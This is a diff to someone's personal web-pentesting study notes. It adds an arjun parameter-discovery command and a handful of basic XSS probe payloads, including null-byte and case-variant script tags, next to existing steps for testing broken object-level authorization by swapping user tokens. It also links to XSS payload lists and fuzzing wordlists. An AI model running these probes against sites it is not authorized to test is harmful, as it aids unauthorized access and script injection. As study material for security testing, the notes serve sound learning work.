@@ -120,5 +120,15 @@ note: page-250 //most important
                  >Create resources as UserA.
                  >Swap out your UserA token for another user’s token.
                  >Using UserB’s token, make the request for UserA’s resources.
-#Side-Channel BOLA/Discloser
-                
+#arjun tools // for http peraminter finding 
+        arjun -u http://bbc.om/
+
+#xsx
+        script>alert("xss")</script>
+        <script>alert(1);</script>
+        <%00script>alert(1)</%00script>
+        SCRIPT>alert("XSS");///SCRIPT>
+        https://github.com/payloadbox/xss-payload-list //here you find payload and many tools 
+        
+        https://github.com/xmendez/wfuzz/tree/master/wordlist // wfuzz wordlist
+        https://netsec.expert/posts/xss-in-2020/index.html      // most powerfull website xss
